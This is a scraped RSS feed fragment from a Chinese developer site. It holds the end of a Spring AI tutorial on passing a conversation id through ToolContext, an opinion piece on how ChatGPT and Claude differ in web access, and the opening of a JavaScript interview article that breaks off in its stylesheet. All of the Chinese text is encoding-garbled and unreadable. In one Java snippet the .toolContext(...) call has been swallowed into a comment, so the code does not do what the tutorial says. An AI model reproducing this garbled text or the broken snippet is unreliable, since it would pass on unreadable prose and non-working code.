	)</span> {    
		<span class="hljs-type">String</span> <span class="hljs-variable">conversationId</span> <span class="hljs-operator">=</span> toolContext.getContext()    
		        .get(ChatMemory.CONVERSATION_ID).toString();    
		<span class="hljs-comment">// æ¥ä¸‹æ¥å°±èƒ½ä½¿ç”¨äº†</span>
    }  
}  
</code></pre>
<p>è¿™ä¸ª id æ˜¯åœ¨è°ƒç”¨é“¾ä¸Šé€šè¿‡ <code>toolContext</code> ä¼ è¿›æ¥çš„ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> Flux&lt;String&gt; <span class="hljs-title function_">chat2AiAdvisor</span><span class="hljs-params">(String msg, String appId)</span> {  
    <span class="hljs-keyword">return</span> chatClient.prompt()  
            .system(<span class="hljs-string">"ä½ æ˜¯æœ‰ç”¨çš„å°åŠ©æ‰‹"</span>)  
            .user(msg)  
            .advisors(advisorSpec -&gt; advisorSpec.param(CONVERSATION_ID, appId))  
            <span class="hljs-comment">// è¿™é‡Œè®¾ç½®åˆ° ToolContext            .toolContext(Map.of(CONVERSATION_ID, appId))  </span>
            .stream().content();  
}  
</code></pre>
<hr/>
<h2 data-id="heading-12">è·‘ä¸€ä¸‹çœ‹çœ‹</h2>
<p>å†™ä¸ªæµ‹è¯•ç”¨ä¾‹ï¼ŒéªŒè¯æ•´ä¸ªé“¾è·¯é€šä¸é€šï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@SpringBootTest</span>  
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Ai2ChatClientTest</span> {    
	<span class="hljs-meta">@Resource</span> 
	<span class="hljs-keyword">private</span> Ai2ChatClient ai2ChatClient;    
    
	<span class="hljs-meta">@Test</span>    
	<span class="hljs-keyword">void</span> <span class="hljs-title function_">chat2Ai</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {    
        Flux&lt;String&gt; flux = ai2ChatClient.chat(<span class="hljs-string">"å¸®æˆ‘ç”Ÿæˆä¸€ä¸ªä¼ä¸šçº§åˆ«çš„åç«¯ï¼Œå¸®æˆ‘ç”Ÿæˆ todolist"</span>, <span class="hljs-string">"12345"</span>);    
        flux.doOnNext(System.out::println).subscribe();    
        Thread.sleep(<span class="hljs-number">10000</span>);    
	}  
}  
</code></pre>
<p>è·‘èµ·æ¥ï¼Œæ§åˆ¶å°é™†é™†ç»­ç»­æ‰“å‡ºæ—¥å¿—ï¼Œå·¥å…·è°ƒç”¨çš„äº‹ä»¶ä¹Ÿæ­£å¸¸æ¨é€ã€‚æ•´ä¸ªé“¾è·¯æ˜¯é€šçš„ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b64ffe6ce9c4412b83e08cb3a64546aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGVpa29vbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769506730&amp;x-signature=l3Y8eRcYjVBlKdVMkmmTisPqD7o%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Claude vs ChatGPTï¼šè”ç½‘èƒ½åŠ›çš„è®¾è®¡å·®å¼‚]]></title>    <link>https://juejin.cn/post/7597058147749347338</link>    <guid>https://juejin.cn/post/7597058147749347338</guid>    <pubDate>2026-01-20T09:52:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597058147749347338" data-draft-id="7597058147749281802" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Claude vs ChatGPTï¼šè”ç½‘èƒ½åŠ›çš„è®¾è®¡å·®å¼‚"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-20T09:52:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="hugo_im"/> <meta itemprop="url" content="https://juejin.cn/user/2717648476706589"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Claude vs ChatGPTï¼šè”ç½‘èƒ½åŠ›çš„è®¾è®¡å·®å¼‚
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2717648476706589/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    hugo_im
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T09:52:36.000Z" title="Tue Jan 20 2026 09:52:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¦‚æœä½ åŒæ—¶æ·±åº¦ä½¿ç”¨è¿‡ <strong>Claude</strong> å’Œ <strong>ChatGPT</strong>ï¼Œå¤§æ¦‚ç‡ä¼šæœ‰ä¸€ä¸ªç›´è§‚æ„Ÿå—ï¼š</p>
<blockquote>
<p><strong>ChatGPT æ›´åƒâ€œä¼šè‡ªå·±ä¸Šç½‘çš„åŠ©ç†â€ï¼Œ Claude æ›´åƒâ€œç­‰ä½ æŠŠèµ„æ–™é€’ç»™å®ƒçš„å·¥ç¨‹å¸ˆâ€ã€‚</strong></p>
</blockquote>
<p>è¿™ä¸æ˜¯èƒ½åŠ›å¼ºå¼±çš„é—®é¢˜ï¼Œè€Œæ˜¯<strong>è®¾è®¡å“²å­¦çš„æ ¹æœ¬å·®å¼‚</strong>ã€‚</p>
<p>è¿™ç¯‡æ–‡ç« ä¸ç«™é˜Ÿã€ä¸æ‹‰è¸©ï¼Œä»ã€Œ<strong>è”ç½‘èƒ½åŠ›çš„è®¾è®¡</strong>ã€è¿™ä¸ªç»´åº¦ï¼Œç³»ç»Ÿæ‹†è§£ Claude å’Œ ChatGPT çš„ä¸åŒå–èˆï¼Œä»¥åŠå®ƒä»¬å„è‡ªæ›´é€‚åˆä»€ä¹ˆåœºæ™¯ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€å…ˆç»™ç»“è®ºï¼ˆç»™å¿™çš„äººï¼‰</h2>
<p>ä¸€å¥è¯æ€»ç»“ï¼š</p>
<blockquote>
<p><strong>ChatGPT æŠŠâ€œè”ç½‘â€å½“äº§å“èƒ½åŠ›ï¼Œ Claude æŠŠâ€œæ•°æ®æ¥æºâ€å½“å·¥ç¨‹è¾¹ç•Œã€‚</strong></p>
</blockquote>
<p>è¿™ç›´æ¥å¯¼è‡´äº†å®ƒä»¬åœ¨ä½¿ç”¨ä½“éªŒã€ç¨³å®šæ€§ã€å®‰å…¨æ€§ã€å·¥ç¨‹å¯æ§æ€§ä¸Šçš„å·¨å¤§å·®å¼‚ã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€ChatGPTï¼šæŠŠâ€œè”ç½‘â€åšæˆé»˜è®¤èƒ½åŠ›</h2>
<h3 data-id="heading-2">1ï¸âƒ£ ä½¿ç”¨æ„Ÿå—ï¼šåƒåœ¨ç”¨â€œAI æµè§ˆå™¨â€</h3>
<p>åœ¨ ChatGPT ä¸­ï¼Œä½ å¯ä»¥å¾ˆè‡ªç„¶åœ°è¯´ï¼š</p>
<blockquote>
<ul>
<li>å¸®æˆ‘æŸ¥ä¸€ä¸‹æŸä¸ªå®˜ç½‘çš„æœ€æ–°æ–‡æ¡£</li>
<li>æœä¸€ä¸‹æœ€è¿‘çš„æ–°é—»</li>
<li>çœ‹ä¸‹æŸä¸ª GitHub é¡¹ç›®çš„ README</li>
</ul>
</blockquote>
<p>æ¨¡å‹ä¼š<strong>è‡ªåŠ¨å†³å®šæ˜¯å¦è”ç½‘ã€ä»€ä¹ˆæ—¶å€™æœã€æœå“ªäº›é¡µé¢</strong>ã€‚</p>
<p>å¯¹ç”¨æˆ·æ¥è¯´ï¼Œè¿™æ˜¯æå¼ºçš„â€œé­”æ³•æ„Ÿâ€ã€‚</p>
<hr/>
<h3 data-id="heading-3">2ï¸âƒ£ è®¾è®¡ç‰¹ç‚¹</h3>
<p><strong>ChatGPT çš„è”ç½‘è®¾è®¡æ ¸å¿ƒæ˜¯ï¼šä½“éªŒä¼˜å…ˆ</strong></p>
<ul>
<li>âœ… è‡ªåŠ¨æœç´¢</li>
<li>âœ… è‡ªåŠ¨ç­›é€‰ç½‘é¡µ</li>
<li>âœ… è‡ªåŠ¨æ€»ç»“ç»“æœ</li>
<li>âŒ æ•°æ®æ¥æºä¸å®Œå…¨å¯æ§</li>
<li>âŒ ä¸ä¸€å®šçŸ¥é“æ¨¡å‹å…·ä½“çœ‹äº†å“ªäº›é¡µé¢</li>
</ul>
<p>ä½ å¾—åˆ°çš„æ˜¯ç»“è®ºï¼Œè€Œä¸æ˜¯è¿‡ç¨‹ã€‚</p>
<hr/>
<h3 data-id="heading-4">3ï¸âƒ£ é€‚åˆè°ï¼Ÿ</h3>
<ul>
<li>å†…å®¹åˆ›ä½œè€…</li>
<li>äº§å“ç»ç†</li>
<li>è½»åº¦å·¥ç¨‹éœ€æ±‚</li>
<li>æ—¥å¸¸æœç´¢ã€è°ƒç ”ã€å­¦ä¹ </li>
</ul>
<blockquote>
<p>ğŸ‘‰ <strong>ä½ å…³å¿ƒçš„æ˜¯â€œç­”æ¡ˆâ€ï¼Œä¸æ˜¯â€œæ•°æ®ä»å“ªæ¥â€</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-5">ä¸‰ã€Claudeï¼šæŠŠâ€œè”ç½‘â€å½“æˆå·¥ç¨‹èƒ½åŠ›</h2>
<p>Claude çš„æ€è·¯å‡ ä¹æ˜¯åè¿‡æ¥çš„ã€‚</p>
<h3 data-id="heading-6">1ï¸âƒ£ Claude é»˜è®¤ï¼š<strong>æˆ‘ä¸è”ç½‘</strong></h3>
<p>åœ¨ Claude é‡Œï¼š</p>
<ul>
<li>ä¸ä¼šå·å·æœç´¢</li>
<li>ä¸ä¼šé»˜è®¤æŠ“ç½‘é¡µ</li>
<li>ä¸ä¼šå‡è®¾ä½ å…è®¸å®ƒè®¿é—®äº’è”ç½‘</li>
</ul>
<p>ä½ å¿…é¡»<strong>æ˜ç¡®å‘Šè¯‰å®ƒ</strong>ï¼š</p>
<ul>
<li>æ•°æ®æ¥è‡ªå“ªé‡Œ</li>
<li>é€šè¿‡ä»€ä¹ˆæ–¹å¼è·å–</li>
<li>æ˜¯å¦å¯ä¿¡</li>
</ul>
<hr/>
<h3 data-id="heading-7">2ï¸âƒ£ Claude çš„æ ¸å¿ƒç†å¿µ</h3>
<blockquote>
<p><strong>Context is a contractï¼ˆä¸Šä¸‹æ–‡æ˜¯ä¸€ç§å¥‘çº¦ï¼‰</strong></p>
</blockquote>
<p>Claude éå¸¸â€œè½´â€åœ°åšæŒä¸€ä»¶äº‹ï¼š</p>
<ul>
<li>æˆ‘åªåŸºäºä½ ç»™æˆ‘çš„ä¸Šä¸‹æ–‡æ¨ç†</li>
<li>æ•°æ®æ¥æºå¿…é¡»æ˜ç¡®</li>
<li>ä¸åˆ¶é€ â€œé»‘ç®±çŸ¥è¯†â€</li>
</ul>
<p>è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆ Claude åœ¨ä¼ä¸šã€æ³•å¾‹ã€åˆè§„åœºæ™¯ä¸­è¯„ä»·æé«˜ã€‚</p>
<hr/>
<h3 data-id="heading-8">3ï¸âƒ£ Claude çš„è”ç½‘æ–¹å¼ï¼Œå…¶å®æ˜¯â€œå¤–åŒ…â€çš„</h3>
<p>Claude æŠŠè”ç½‘æ‹†æˆäº†ä¸‰å±‚ï¼š</p>





















<table><thead><tr><th>å±‚çº§</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>Web Fetch</td><td>å—æ§ç½‘é¡µæŠ“å–</td></tr><tr><td>MCP</td><td>ä½ è‡ªå»ºçš„æ•°æ®è®¿é—®èƒ½åŠ›</td></tr><tr><td>äººå·¥æ³¨å…¥</td><td>ä½ è‡ªå·±è´´æ•°æ®</td></tr></tbody></table>
<p><strong>æ¨¡å‹åªè´Ÿè´£æ¨ç†ï¼Œä¸è´Ÿè´£â€œå·å·è·å–ä¿¡æ¯â€</strong> ã€‚</p>
<hr/>
<h2 data-id="heading-9">å››ã€ä¸¤ç§è®¾è®¡å“²å­¦çš„æ­£é¢å¯¹æ¯”</h2>
<h3 data-id="heading-10">1ï¸âƒ£ æ˜¯å¦é»˜è®¤è”ç½‘</h3>

























<table><thead><tr><th>é¡¹ç›®</th><th>ChatGPT</th><th>Claude</th></tr></thead><tbody><tr><td>é»˜è®¤è”ç½‘</td><td>âœ… æ˜¯</td><td>âŒ å¦</td></tr><tr><td>è‡ªåŠ¨æœç´¢</td><td>âœ…</td><td>âŒ</td></tr><tr><td>æ˜ç¡®æˆæƒ</td><td>âŒ</td><td>âœ…</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-11">2ï¸âƒ£ æ•°æ®å¯æ§æ€§</h3>

























<table><thead><tr><th>ç»´åº¦</th><th>ChatGPT</th><th>Claude</th></tr></thead><tbody><tr><td>æ•°æ®æ¥æºå¯è¿½æº¯</td><td>ä¸€èˆ¬</td><td>éå¸¸å¼º</td></tr><tr><td>æ˜¯å¦å¯å®¡è®¡</td><td>è¾ƒå¼±</td><td>å¾ˆå¼º</td></tr><tr><td>ä¼ä¸šå¯æ§æ€§</td><td>ä¸­</td><td>é«˜</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-12">3ï¸âƒ£ å·¥ç¨‹é›†æˆèƒ½åŠ›</h3>

























<table><thead><tr><th>ç»´åº¦</th><th>ChatGPT</th><th>Claude</th></tr></thead><tbody><tr><td>é€‚åˆå¿«é€Ÿç”¨</td><td>âœ…</td><td>âš ï¸</td></tr><tr><td>é€‚åˆç³»ç»Ÿé›†æˆ</td><td>âš ï¸</td><td>âœ…</td></tr><tr><td>é€‚åˆä¸¥è‚ƒç³»ç»Ÿ</td><td>ä¸€èˆ¬</td><td>å¾ˆå¼º</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-13">äº”ã€ä¸€ä¸ªå…¸å‹åœºæ™¯å¯¹æ¯”</h2>
<h3 data-id="heading-14">åœºæ™¯ï¼šåˆ†æçº¿ä¸ŠæŠ€æœ¯æ–‡æ¡£</h3>
<h4 data-id="heading-15">ChatGPT çš„æ–¹å¼</h4>
<blockquote>
<p>â€œæˆ‘å¸®ä½ æœäº†ä¸€äº›èµ„æ–™ï¼Œç»“è®ºæ˜¯â€¦â€¦â€</p>
</blockquote>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>å¿«</li>
<li>çœäº‹</li>
</ul>
<p>é—®é¢˜ï¼š</p>
<ul>
<li>ä½ ä¸çŸ¥é“å®ƒçœ‹äº†å“ªäº›ç‰ˆæœ¬</li>
<li>æ–‡æ¡£æ˜¯å¦æœ€æ–°ä¸ç¡®å®š</li>
<li>ä¸é€‚åˆåšæŠ€æœ¯åŸºå‡†</li>
</ul>
<hr/>
<h4 data-id="heading-16">Claude çš„æ–¹å¼</h4>
<blockquote>
<p>â€œè¯·ä½ é€šè¿‡ Web Fetch / MCP è·å–è¯¥æ–‡æ¡£å†…å®¹ï¼Œç„¶åæˆ‘æ¥åˆ†æã€‚â€</p>
</blockquote>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>æ•°æ®æ¥æºæ¸…æ™°</li>
<li>å¯å¤ç°</li>
<li>å¯å®¡è®¡</li>
</ul>
<p>é—®é¢˜ï¼š</p>
<ul>
<li>å‰æœŸæˆæœ¬ç•¥é«˜</li>
<li>å¯¹éå·¥ç¨‹ç”¨æˆ·ä¸å‹å¥½</li>
</ul>
<hr/>
<h2 data-id="heading-17">å…­ã€ä¸ºä»€ä¹ˆ Claude è¿™ä¹ˆâ€œåäººæ€§â€ï¼Ÿ</h2>
<p>è¿™æ˜¯å¾ˆå¤šäººä¸€å¼€å§‹ç”¨ Claude ä¼šåæ§½çš„ç‚¹ã€‚</p>
<p>ä½†ç«™åœ¨å·¥ç¨‹è§’åº¦ï¼Œè¿™æ˜¯<strong>åˆ»æ„ä¸ºä¹‹</strong>ã€‚</p>
<p>Claude çš„ç›®æ ‡ç”¨æˆ·å¹¶ä¸åªæ˜¯æ™®é€šæ¶ˆè´¹è€…ï¼Œè€Œæ˜¯ï¼š</p>
<ul>
<li>ä¼ä¸š</li>
<li>æ³•åŠ¡</li>
<li>é‡‘è</li>
<li>ç ”å‘å›¢é˜Ÿ</li>
<li>AI ç³»ç»Ÿé›†æˆæ–¹</li>
</ul>
<p>åœ¨è¿™äº›åœºæ™¯ä¸­ï¼š</p>
<blockquote>
<p><strong>â€œæˆ‘ç¡®å®šæ¨¡å‹ç”¨äº†ä»€ä¹ˆæ•°æ®â€ æ¯” â€œæ¨¡å‹å¾ˆèªæ˜â€ æ›´é‡è¦ã€‚</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-18">ä¸ƒã€åˆ°åº•è¯¥æ€ä¹ˆé€‰ï¼Ÿ</h2>
<h3 data-id="heading-19">å¦‚æœä½ æ›´å…³å¿ƒï¼š</h3>
<ul>
<li>å¿«é€Ÿç­”æ¡ˆ</li>
<li>çµæ„Ÿ</li>
<li>è°ƒç ”æ•ˆç‡</li>
</ul>
<p>ğŸ‘‰ <strong>é€‰ ChatGPT</strong></p>
<hr/>
<h3 data-id="heading-20">å¦‚æœä½ æ›´å…³å¿ƒï¼š</h3>
<ul>
<li>æ•°æ®å¯ä¿¡åº¦</li>
<li>å·¥ç¨‹å¯æ§</li>
<li>å¯å¤ç°æ€§</li>
<li>ä¼ä¸šçº§ä½¿ç”¨</li>
</ul>
<p>ğŸ‘‰ <strong>é€‰ Claude</strong></p>
<hr/>
<h2 data-id="heading-21">å…«ã€ä¸€å¥è¯æ€»ç»“</h2>
<blockquote>
<p><strong>ChatGPT æ˜¯â€œä¼šè‡ªå·±ä¸Šç½‘çš„åŠ©ç†â€ï¼Œ Claude æ˜¯â€œç­‰ä½ æä¾›èµ„æ–™çš„é«˜çº§åˆ†æå¸ˆâ€ã€‚</strong></p>
</blockquote>
<p>ä¸€ä¸ªè¿½æ±‚<strong>æè‡´ä½“éªŒ</strong>ï¼Œ ä¸€ä¸ªè¿½æ±‚<strong>å·¥ç¨‹è¾¹ç•Œæ¸…æ™°</strong>ã€‚</p>
<p>æ²¡æœ‰è°æ›´é«˜çº§ï¼Œ åªæ˜¯ä½ ç«™åœ¨å“ªä¸€ä¾§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[githubåŠ æ˜Ÿ star è‰¾ç±³è‰ 2026 å‰ç«¯é¢è¯•æ ¸å¿ƒï¼šJavaScript åŸºç¡€ç¯‡ï¼ˆç²¾ç‚¼ç‰ˆï¼‰]]></title>    <link>https://juejin.cn/post/7597270795211620392</link>    <guid>https://juejin.cn/post/7597270795211620392</guid>    <pubDate>2026-01-20T10:04:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597270795211620392" data-draft-id="7597259271110066216" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="githubåŠ æ˜Ÿ  star è‰¾ç±³è‰  2026 å‰ç«¯é¢è¯•æ ¸å¿ƒï¼šJavaScript åŸºç¡€ç¯‡ï¼ˆç²¾ç‚¼ç‰ˆï¼‰"/> <meta itemprop="keywords" content="GitHub,Java"/> <meta itemprop="datePublished" content="2026-01-20T10:04:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¼€æºä¹‹çœ¼"/> <meta itemprop="url" content="https://juejin.cn/user/55438993800919"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            githubåŠ æ˜Ÿ  star è‰¾ç±³è‰  2026 å‰ç«¯é¢è¯•æ ¸å¿ƒï¼šJavaScript åŸºç¡€ç¯‡ï¼ˆç²¾ç‚¼ç‰ˆï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/55438993800919/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¼€æºä¹‹çœ¼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:04:24.000Z" title="Tue Jan 20 2026 10:04:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em 